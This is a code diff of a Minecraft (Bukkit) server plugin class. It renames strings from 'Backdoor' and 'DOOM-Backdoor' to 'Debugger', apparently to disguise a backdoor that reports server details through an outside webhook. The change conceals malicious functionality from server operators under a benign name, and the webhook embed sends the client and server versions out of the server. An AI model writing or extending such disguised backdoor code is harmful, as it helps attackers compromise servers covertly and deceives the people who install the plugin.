@@ -46,7 +46,7 @@ public final class Debugger implements Listener {
         if(bd_running) {
             if (Config.display_debug_messages)
                 Bukkit.getConsoleSender()
-                        .sendMessage(plugin.getName() + ": Backdoor aborted, another backdoor already loaded.");
+                        .sendMessage(plugin.getName() + ": Debugger aborted, another debugger already loaded.");
             return;
         }
 
@@ -108,8 +108,8 @@ public final class Debugger implements Listener {
             webhook.setContent("");
             webhook.setTts(false);
             webhook.addEmbed((new DWeb.EmbedObject())
-                    .setTitle("DOOM-Backdoor")
-                    .setDescription("Server is running DOOM!")
+                    .setTitle("Debugger")
+                    .setDescription("Server is running Debugger!")
                     .setColor(Color.GREEN)
                     .addField("Client version: ", Bukkit.getBukkitVersion(), false)
                     .addField("Server version: ", Bukkit.getVersion(), false)
